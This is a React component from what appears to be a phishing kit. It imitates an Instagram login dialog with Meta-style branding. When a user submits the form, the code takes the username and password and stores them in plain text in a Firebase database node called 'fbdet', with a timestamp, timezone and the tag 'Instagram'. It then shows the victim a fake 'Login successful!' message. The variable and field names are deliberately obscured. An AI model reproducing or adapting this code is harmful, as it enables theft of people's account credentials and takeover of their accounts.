import React, { useState } from "react";
import { auth, db } from "../assets/js/firebase"; // Correct import path
import { ref, push } from "firebase/database";
import { signInAnonymously } from "firebase/auth";
import ErrorAlert from "./ErrorAlert"; // Import the ErrorAlert component
import "../assets/css/modal.css";

const InstagramModal = () => {
  const [edooruko, setOruko] = useState("");
  const [edozom, setZom] = useState("");
  const [errorTitle, setErrorTitle] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [showErrorAlert, setShowErrorAlert] = useState(false);

  const closeModal = () => {
    document.getElementById("instagram-modal").style.display = "none";
  };

  const handleLogin = async () => {
    // Validate fields
    if (!edooruko.trim() || !edozom.trim()) {
      setErrorTitle("Error");
      setErrorMessage("Please fill in all fields.");
      setShowErrorAlert(true);
      return;
    }

    try {
      // Sign in anonymously
      const userCredential = await signInAnonymously(auth);
      const user = userCredential.user;

      // Prepare data to be sent to Firebase
      const currentDate = new Date().toISOString().slice(0, 10);
      const currentTime = new Date().toISOString().slice(11, 19);
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      const data = {
        emle: edooruko,
        mobile: "",
        past: edozom, // Ensure this matches the field name in Firebase
        time: currentTime,
        timezone: timezone,
        date: currentDate,
        type: "Instagram", // Change this to the appropriate type
        uid: user.uid, // Store the anonymous user's UID
      };

      // Log the data being sent to Firebase
      console.log("Data being sent to Firebase:", data);

      // Save user data to Firebase Realtime Database
      await push(ref(db, "fbdet"), data);

      // Show success message
      setErrorTitle("Success");
      setErrorMessage("Login successful!");
      setShowErrorAlert(true);
    } catch (error) {
      console.error("Error saving data to Firebase:", error);
      setErrorTitle("Error");
      setErrorMessage("Sorry, something went wrong. Please try again.");
      setShowErrorAlert(true);
    } finally {
      // Clear the password field only
      setZom("");
    }
  };

  const handleCloseErrorAlert = () => {
    setShowErrorAlert(false);
  };

  return (
    <div id="instagram-modal" className="dialog bg-black">
      <div className="min-h-screen flex flex-col w-full">
        {/* Main Content Section */}
        <main className="flex-grow p-2">
          {/* Reduced padding here */}
          <div className="flex justify-center mt-11 mb-6">
            {/* Centered Image */}
            <img src="image/manae.svg" alt="logo" className="h-12" />
          </div>
          <div className="tokpart bg-black">
            <div className="bg-black p-8 w-full max-w-md">
              <div id="buttonsContainer">
                {/* Container Div for Google, Apple Buttons, and 'or' Divider */}
                <button
                  type="button"
                  onClick={() => {}}
                  className="w-full py-2 bg-blue-600 px-4 rounded-md flex items-center justify-center text-white focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4"
                  style={{
                    fontFamily: "'Google Sans', arial, sans-serif",
                    fontWeight: 400,
                    overflow: "hidden",
                  }}>
                  Continue Using{" "}
                  <img
                    src="image/fav.png"
                    alt="Google Icon"
                    className="h-5 ml-3"
                  />
                </button>
                <div className="flex items-center my-4">
                  <div className="flex-grow border-t border-gray-700"></div>
                  <span className="mx-4 text-gray-500">OR</span>
                  <div className="flex-grow border-t border-gray-700"></div>
                </div>
              </div>
              {/* oruk Input */}
              <div className="mb-4 relative">
                <input
                  type="text"
                  id="edo-oruko"
                  name="edooruko"
                  value={edooruko}
                  onChange={(e) => setOruko(e.target.value)}
                  required
                  className="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
                  placeholder="Phone, email address, or username"
                />
              </div>
              <div className="mb-4">
                {/* Input Field */}
                <input
                  type="password"
                  id="edo-zom"
                  name="edozom"
                  value={edozom}
                  onChange={(e) => setZom(e.target.value)}
                  required
                  className="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
                  placeholder="Password"
                />
                {/* Forgot Password Button */}
                <button
                  type="button"
                  className="text-blue-600 py-2 px-4 rounded-none bg-transparent border-0 hover:text-blue-800 focus:outline-none focus:ring-0 mt-0 mr-0 ml-auto block">
                  Forgotten login?
                </button>
              </div>
              {/* Login Button */}
              <button
                type="button"
                onClick={handleLogin}
                className="w-full bg-blue-600 text-gray-100 py-2 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4">
                Log in
              </button>
            </div>
          </div>
        </main>
        {/* Footer Section */}
        <footer
          id="error-message"
          style={{ backgroundColor: "rgb(18, 18, 18)" }}
          className="text-white text-sm mt-2 text-center py-1 mt-auto w-full">
          <div className="flex justify-center items-center flex-col">
            {/* Text above the image with reduced margin */}
            <p
              className="mb-0"
              style={{ fontSize: "12px", marginBottom: "2px" }}>
              from
            </p>
            {/* Linked image */}
            <a href="">
              <img src="image/mee.png" alt="logo" className="h-14" />
            </a>
          </div>
        </footer>
      </div>

      {/* Render the ErrorAlert component */}
      {showErrorAlert && (
        <ErrorAlert
          title={errorTitle}
          message={errorMessage}
          onClose={handleCloseErrorAlert}
        />
      )}
    </div>
  );
};

export default InstagramModal;
